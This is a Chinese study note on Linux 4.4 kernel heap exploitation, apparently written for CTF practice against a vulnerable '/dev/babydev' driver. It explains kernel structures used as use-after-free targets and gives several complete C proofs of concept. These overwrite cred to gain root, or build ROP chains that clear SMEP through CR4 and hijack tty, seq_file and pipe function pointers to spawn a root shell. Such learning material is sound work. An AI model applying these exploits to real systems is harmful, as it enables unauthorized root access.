环境是 linux 4.4.72，比较老的一个版本。

## 结构体总结

### cred

当创建一个新进程时，内核会为其申请一个 struct cred 结构体，用于存放进程信息。

cred 结构体内容如下：

```c
// 结构体大小 0xa8
struct cred {
	atomic_long_t              usage;                /*     0     8 */
	kuid_t                     uid;                  /*     8     4 */
	kgid_t                     gid;                  /*    12     4 */
	kuid_t                     suid;                 /*    16     4 */
	kgid_t                     sgid;                 /*    20     4 */
	kuid_t                     euid;                 /*    24     4 */
	kgid_t                     egid;                 /*    28     4 */
	kuid_t                     fsuid;                /*    32     4 */
	kgid_t                     fsgid;                /*    36     4 */
	unsigned int               securebits;           /*    40     4 */
	
	/* XXX 4 bytes hole, try to pack */
	
	kernel_cap_t               cap_inheritable;      /*    48     8 */
	kernel_cap_t               cap_permitted;        /*    56     8 */
	/* --- cacheline 1 boundary (64 bytes) --- */
	kernel_cap_t               cap_effective;        /*    64     8 */
	kernel_cap_t               cap_bset;             /*    72     8 */
	kernel_cap_t               cap_ambient;          /*    80     8 */
	unsigned char              jit_keyring;          /*    88     1 */
	
	/* XXX 7 bytes hole, try to pack */
	
	struct key *               session_keyring;      /*    96     8 */
	struct key *               process_keyring;      /*   104     8 */
	struct key *               thread_keyring;       /*   112     8 */
	struct key *               request_key_auth;     /*   120     8 */
	/* --- cacheline 2 boundary (128 bytes) --- */
	void *                     security;             /*   128     8 */
	struct user_struct *       user;                 /*   136     8 */
	struct user_namespace *    user_ns;              /*   144     8 */
	struct ucounts *           ucounts;              /*   152     8 */
	struct group_info *        group_info;           /*   160     8 */
	union {
		int                non_rcu;              /*   168     4 */
		struct callback_head rcu;                /*   168    16 */
	};                                               /*   168    16 */

/* size: 184, cachelines: 3, members: 26 */
/* sum members: 173, holes: 2, sum holes: 11 */
/* last cacheline: 56 bytes */
};
```

最常见的打法就是把这个结构体的 uid / gid / suid / sgid 等全部改成 0，使得该子进程拥有root权限。

不过这个结构体在内核 4.5 之后，会使用单独的 叫做 `cred_jar` 的 kmem-cache 来独立分配，普通的 UAF 无法拿到这个结构体，也就没办法打了。


举个例子，在 `_do_fork` 上下断点，`fork` 函数会调用 `prepare_creds` 为子进程创建 cred 结构体，而 `prepare_creds` 会调用 `kmem_cache_alloc`：

![fork调用栈](https://pic1.imgdb.cn/item/68ecc757c5157e1a886c8f20.png)

然后 `p (struct kmem_cache)*0xffff880002c01800` 可以观察到这个函数是从 `kmalloc-192` 取 obj 的。

poc 如下：

```c
#include <kernel.h>

int main() {
    int fd1 = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);
    ioctl(fd1, 0x10001, 0xa8);
    close(fd1);  // uaf
    pid_t pid = fork();
    if (pid < 0) {
        error("fork failed, pid = %d", pid);
    } else if (pid == 0) {
        info("child pid => %d", getpid());
        char zero[30] = {0};
        write(fd2, zero, 28);
        if (getuid() == 0) {
            success("getshell");
            system("/bin/sh");
        }
    } else {
        wait(NULL);
    }
    close(fd2);
    return 0;
}
```


### tty_struct


当用户态执行 `open("dev/ptmx",2);` 或者 `open("/dev/ptmx", O_RDWR | O_NOCTTY)` 后，内核中的处理过程如下图所示：

![tty_struct 分配流程](https://pic1.imgdb.cn/item/68ecca5fc5157e1a886c9eca.png)

其中，`alloc_tty_struct` 会从 `kmalloc-1024` 里取 obj 以满足 `tty_struct` 的 0x2e0 的内存需求。

`open` 操作后，用户态获得一个文件描述符 `fd`。用户态可对该 `fd` 进行 `tty_operations` 中包含的所有操作，如 `write`\`ioctl` 等。

如果利用漏洞改掉 `tty_struct` 中 `ops` 指向的函数表，就能实现控制流劫持。

如何确定申请到的 `tty_struct` 的位置呢？可以通过 `cat /proc/kallsyms | grep "ptm_unix98_lookup"` 找到 `ptm_unix98_lookup` 的位置，然后 `search -8` 找到 rwx 段上的地址，就能定位到 `ptm_unix98_ops`，然后再根据 `ptm_unix98_ops` 定位即可，那个地址就是 `tty_operations` 字段。

另外，0x5401 是 `tty_struct` 的魔数。


调试时，比如说 hook 的是 `pty_write` 函数，这个函数会调用 `n_tty_write`，在 n_tty_write+892 处下断点即可断在调用 hook 的函数前。

还有一种方法是使用硬件访问断点 `rwatch`，比如 `rwatch *A`，A 是 `pty_write` 函数地址。

```c
#include <kernel.h>


#define mov_rsp_rax 0xffffffff818855cf
#define pop_rsp_ret 0xffffffff8101ebc5
#define pop_rax_ret 0xffffffff8101c216
#define mov_cr4_rax_pop_ret 0xffffffff8100f034
#define swapgs_ret 0xffffffff81885588
#define iretq 0xffffffff81884177


int main() {
    save_status();

    unsigned long rop_chain[30] = {0};
    int index = 0;
    rop_chain[index++] = pop_rax_ret;
    rop_chain[index++] = 0x6f0;
    rop_chain[index++] = mov_cr4_rax_pop_ret;
    rop_chain[index++] = 0;
    rop_chain[index++] = (unsigned long)get_root;
    rop_chain[index++] = swapgs_ret;
    rop_chain[index++] = iretq;
    rop_chain[index++] = (unsigned long)get_root_shell;
    rop_chain[index++] = user_cs;
    rop_chain[index++] = user_rflags;
    rop_chain[index++] = user_sp;
    rop_chain[index++] = user_ss;


    int fd1 = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);
    ioctl(fd1, 0x10001, 0x2e0);
    close(fd1);  // uaf


    int fd_tty = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    if (fd_tty < 0) {
        error("open ptmx failed: %d", fd_tty);
    }
    success("fd_tty => %d\n", fd_tty);

    unsigned long *mem[4];
    unsigned long fake_ops[30] = {0, 1, 2, 3, 4, 5, 6, 7};
    read(fd2, mem, 32);
    for (int i = 0; i < 4; ++i)
        info("0x%llx", mem[i]);
    // 修改 ops 为 fake_ops
    mem[3] = fake_ops;
    fake_ops[0] = pop_rsp_ret;  // 继续迁移到 rop_chain 上
    fake_ops[1] = (unsigned long)rop_chain;
    fake_ops[7] = mov_rsp_rax;  // pty_write，注意到 rax 为 fake_ops 地址，可以用来栈迁移

    write(fd2, mem, 0x38);

    char a[32];
    write(fd_tty, a, 32);  // 触发

    close(fd_tty);
    close(fd2);
    return 0;
}
```

这个打法要求题目的 rcS 脚本里挂载了 `pts`，如果没有挂载的话就无法打开了。

### seq_operations

在用户态执行 `open("/proc/self/stat",0);` 后，内核中的调用过程如下图所示：

![seq](https://pic1.imgdb.cn/item/68ed244fc5157e1a886d07b5.png)

内核中会调用 `single_open()` 函数，而该函数中会为 `struct seq_operations` 结构体申请一段内存空间（0x20 字节大小，对应 `kmalloc-32`）。

返回的结构体里有四个字段：

```c
struct seq_operations {
	void *                     (*start)(struct seq_file *, loff_t *); /*     0     8 */
	void                       (*stop)(struct seq_file *, void *); /*     8     8 */
	void *                     (*next)(struct seq_file *, void *, loff_t *); /*    16     8 */
	int                        (*show)(struct seq_file *, void *); /*    24     8 */

/* size: 32, cachelines: 1, members: 4 */
/* last cacheline: 32 bytes */
};
```


其中 `start` 和 `stop` 都是可以被劫持的，当用户态对该 `fd` 进行读操作 `read(fd,buf,size)` 时，在内核中会调用 `seq_operations->start` 函数指针；随后也会调用 `seq_operations->stop` 函数指针，不过比较遗憾的是，这两个函数指针都无法控制参数，所以需要配合 `pt_regs` 结构体使用。

> `pt_regs` 结构体：用户态的寄存器在进入内核态的时候会保留在栈底（srop的原理），因此若我们进入内核态前提前控制了这些寄存器的值，那么便可以在内核栈底留下一些可控数据。
>
> 在默认开启 `CONFIG_RANDOMIZE_KSTACK_OFFSET` 的新版本内核当中这已经是时泪了（悲），因为这个保护使得固定函数调用到内核栈底的偏移值是变化的

原先我们触发函数指针的方法是 `read(fd, buf, size)`，只需要用汇编语言实现如下就可以了：

```c
    asm volatile (
        ".intel_syntax noprefix;"
        "mov r15, 0x11111111;"
        "mov r14, 0x22222222;"
        "mov r13, 0x33333333;"
        "mov r12, 0x44444444;"
        "mov rbp, 0x55555555;"
        "mov rbx, 0x66666666;"
        "mov r11, 0x77777777;"
        "mov r10, 0x88888888;"
        "mov r9,  0x99999999;"
        "mov r8,  0xaaaaaaaa;"
        "xor rax, rax;"
        "mov rcx, 0xbbbbbbbb;"
        "mov rdx, 8;"
        "mov rsi, rsp;"
        "mov rdi, fd_stat;"        // 通过 seq_operations->stat 来触发
        "syscall;"
    );
```

poc 如下

```c
#include <kernel.h>


// hint: 使用全局变量的原因是内联汇编不能使用局部变量

unsigned long mov_rsp_rax = 0xffffffff818855cf;
unsigned long pop_rsp_ret = 0xffffffff8101ebc5;
unsigned long pop_rax_ret = 0xffffffff8101c216;
unsigned long mov_cr4_rax_pop_ret = 0xffffffff8100f034;
#define swapgs_ret 0xffffffff81885588
#define iretq 0xffffffff81884177
#define add_rsp_0x150_ret 0xffffffff812743a5
unsigned long pop_rdi_ret = 0xffffffff810d238d;

int fd_stat;
unsigned long *rop;
// unsigned long mov_cr4_rax_pop_ret = mov_cr4_rax_pop_ret;

int main() {
    save_status();
    bind_core(0);
    unsigned long rop_chain[30] = {0};
    int index = 0;
    rop_chain[index++] = pop_rax_ret;
    rop_chain[index++] = 0x6f0;
    rop_chain[index++] = mov_cr4_rax_pop_ret;
    rop_chain[index++] = 0;
    rop_chain[index++] = (unsigned long)get_root;
    rop_chain[index++] = swapgs_ret;
    rop_chain[index++] = iretq;
    rop_chain[index++] = (unsigned long)get_root_shell;
    rop_chain[index++] = user_cs;
    rop_chain[index++] = user_rflags;
    rop_chain[index++] = user_sp;
    rop_chain[index++] = user_ss;
    rop = rop_chain;

    int fd1 = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);
    ioctl(fd1, 0x10001, 0x20);
    close(fd1);  // uaf

    fd_stat = open("/proc/self/stat", 0);

    unsigned long mem[4] = {0, 1, 2, 3};
    info("mem => {0x%llx}\n", mem);
    read(fd2, mem, 32);
    for (int i = 0; i < 4; ++i) {
        info("0x%llx", mem[i]);  // 不知道为什么，我这里泄漏不出来 seq_ops 的内容???
    }
    mem[0] = 0xffffffff815f5951; // add rsp,0x108; pop rbx; pop r12; pop r13; pop r14; pop r15; pop rbp; ret
    write(fd2, mem, 32);

    // getchar();

// 26:0130│ r12 0xffff880000a17f20 ◂— 0
// 27:0138│+0d8 0xffff880000a17f28 ◂— 0x66666666 /* 'ffff' */
// 28:0140│+0e0 0xffff880000a17f30 ◂— 0x44444444 /* 'DDDD' */
// 29:0148│+0e8 0xffff880000a17f38 ◂— 0x33333333 /* '3333' */
// 2a:0150│+0f0 0xffff880000a17f40 ◂— 0x22222222 /* '""""' */
// 2b:0158│+0f8 0xffff880000a17f48 ◂— 0x55555555 /* 'UUUU' */
    asm volatile (
        ".intel_syntax noprefix;"
        "mov r15, 0x11111111;"
        "mov r14, 0x22222222;"
        "mov r13, mov_rsp_rax;"
        "mov r12, rop;"
        "mov rbp, 0x55555555;"
        "mov rbx, pop_rax_ret;"
        "mov r11, 0x77777777;"
        "mov r10, 0x88888888;"
        "mov r9,  0x99999999;" // 后半部分
        "mov r8,  0xaaaaaaaa;"
        "xor rax, rax;"
        "mov rcx, 0xbbbbbbbb;"
        "mov rdx, 8;"
        "mov rsi, rsp;"
        "mov rdi, fd_stat;"        // 通过 seq_operations->stat 来触发
        "syscall;"
    );

    close(fd_stat);
    close(fd2);
    return 0;
}
```

这个结构体还可以用来绕过 KPTI 保护，后面再说。

另外就是，这个地方用到的抬高 `rsp` 的 gadget 怎么确定呢？首先，调试确定目标是 `add rsp, 0x138`，已知 kernel 里的 `add rsp, xxx` gadget 后面都会跟一些 `pop xxx; ret`（似乎至少 3 个），所以我们大概可以从 `add rsp, 0x120` 找起：
1. python 执行 `enhex(asm("add rsp, 0x120"))` 得到 `4881c420010000`
2. `ROPgadget --binary ./vmlinux --opcode 4881c420010000`，逐个在 gdb 中查看对应的汇编
3. 成功找到 `0xffffffff816d0445` 正好是 `add rsp, 0x120; pop rbx; pop r12; pop rbp; ret`

用类似的方法还可以找到很多满足条件的 gadget，毕竟第二次栈迁移只需要 0x18 字节（3 条 gadget），所以 `add rsp, 0x118` 和 `add rsp, 0x110` 之类的也许都能找到符合要求的 gadget。


### subprocess_info

这个打法应该是来自于 [CVE-2016-6187](https://duasynt.com/blog/cve-2016-6187-heap-off-by-one-exploit) 的第二部分。


但是，创建 `struct subprocess_info` 和调用它内部的函数指针在同一个代码路径上，所以我们需要条件竞争，在 5.11 版本之前也许我们可以使用 `userfaultfd()` 来打，但是现在已经是时代的眼泪了，所以这里先不介绍了，后面真遇到了再补吧。

cve 对应的 [poc](https://github.com/vnik5287/cve-2016-6187-poc/blob/master/matreshka.c)

~~当我们在用户态执行 `socket(22, AF_INET, 0);` 时，内核调用栈如下图所示：~~


### pipe_buffer

用户态执行 `pipe(pipe_fd)` 后，内核态调用过程如下图所示：

![pipe_fd](https://pic1.imgdb.cn/item/68f12707c5157e1a8879a3e1.png)


虽然 `alloc_pipe_info+229` 处调用的 `_kmalloc` 的参数是 0x280，但其实内核会给他分配一个 0x400 的 obj。

`pipe` 管道创建成功后，用户态将获得两个文件描述符 `fd[2]`，其中 `fd[0]` 为从管道读，`fd[1]` 为向管道写。

当用户态对管道调用 `close()` 关闭文件描述符时，调用 `free_pipe_info+82` 处将会调用 `pipe_buffer` 中的 `ops->release` 函数。

```c
struct pipe_buffer {
	struct page *              page;                 /*     0     8 */
	unsigned int               offset;               /*     8     4 */
	unsigned int               len;                  /*    12     4 */
	const struct pipe_buf_operations  * ops;         /*    16     8 */
	unsigned int               flags;                /*    24     4 */
	
	/* XXX 4 bytes hole, try to pack */
	
	long unsigned int          private;              /*    32     8 */
	
	/* size: 40, cachelines: 1, members: 6 */
	/* sum members: 36, holes: 1, sum holes: 4 */
	/* last cacheline: 40 bytes */
};
```

通过搜索 `anon_pipe_buf_release` 可以定位 `anon_pipe_buf_ops`。


poc：

```c
#include <kernel.h>


// hint: 使用全局变量的原因是内联汇编不能使用局部变量

unsigned long mov_rsp_rax = 0xffffffff818855cf;
unsigned long pop_rsp_ret = 0xffffffff8101ebc5;
unsigned long pop_rax_ret = 0xffffffff8101c216;
unsigned long mov_cr4_rax_pop_ret = 0xffffffff8100f034;
#define swapgs_ret 0xffffffff81885588
#define iretq 0xffffffff81884177
#define add_rsp_0x150_ret 0xffffffff812743a5
unsigned long pop_rdi_ret = 0xffffffff810d238d;

int fd, fd1, fd2;
unsigned long *rop;

// 全局变量的写法
// unsigned long fake_ops[4] = {0};


int main() {
    // if (mlock(fake_ops, sizeof(fake_ops)) == -1) {
    //     perror("mlock failed");
    //     // 在实际利用中可能需要处理这个错误，或者直接退出
    //     return -1;
    // }


    save_status();
    bind_core(0);
    unsigned long rop_chain[30] = {0};
    int index = 0;
    rop_chain[index++] = pop_rax_ret;
    rop_chain[index++] = 0x6f0;
    rop_chain[index++] = mov_cr4_rax_pop_ret;
    rop_chain[index++] = 0;
    rop_chain[index++] = (unsigned long)get_root;
    rop_chain[index++] = swapgs_ret;
    rop_chain[index++] = iretq;
    rop_chain[index++] = (unsigned long)get_root_shell;
    rop_chain[index++] = user_cs;
    rop_chain[index++] = user_rflags;
    rop_chain[index++] = user_sp;
    rop_chain[index++] = user_ss;
    rop = rop_chain;

    fd1 = open("/dev/babydev", 2);
    fd2 = open("/dev/babydev", 2);
    ioctl(fd1, 0x10001, 0x400);
    close(fd1);  // uaf


    // getchar();
    int pipe_fd[2];
    pipe(pipe_fd);

    // info("fd => {%d}", fd);
    unsigned long mem[4] = {0, 1, 2, 3};
    unsigned long test[1000];


    // write(pipe_fd[1], rop_chain, 0x1);



    read(fd2, mem, 0x32);
    // for (int i = 0; i < 4; ++i) {
    //     info("0x%llx", mem[i]);
    // }

    // 局部变量的写法
    unsigned long fake_ops[4] = {0};

    fake_ops[2] = mov_rsp_rax;
    fake_ops[0] = pop_rsp_ret;
    fake_ops[1] = (unsigned long)rop;
    for (int i = 0; i < 4; ++i) {
        info("0x%llx", fake_ops[i]);
    }
    info("fake_ops => 0x%llx", fake_ops);


    mem[2] = (unsigned long)fake_ops;
    write(fd2, mem, 0x32);

    // getchar();
    close(pipe_fd[0]);
    close(pipe_fd[1]);
    close(fd2);
    return 0;
}
```

### shm_file_data

```c
    int shmid = shmget(IPC_PRIVATE, 100, 0600);
    if (shmid == -1) {
        error("shmget error");
    }
    char *shmaddr = shmat(shmid, NULL, 0);
    if (shmaddr == (void *)-1) {
        error("shmat error");
    }
```

当用户态执行以上代码时，`shmat()` 函数对应的内核态调用过程如下图所示：

![](https://pic1.imgdb.cn/item/68f1b5dac5157e1a887a7d7b.png)

内核中调用 `do_shmat()` 函数，为 `struct shm_file_data` 结构体申请一段内存空间（0x20字节大小）。

```c
struct shm_file_data {
	int                        id;                   /*     0     4 */
	
	/* XXX 4 bytes hole, try to pack */
	
	struct ipc_namespace *     ns;                   /*     8     8 */
	struct file *              file;                 /*    16     8 */
	const struct vm_operations_struct  * vm_ops;     /*    24     8 */
	
	/* size: 32, cachelines: 1, members: 4 */
	/* sum members: 28, holes: 1, sum holes: 4 */
	/* last cacheline: 32 bytes */
};
```

这个结构体只能用来打信息泄漏，目前还劫持不了控制流。


### msg_msg


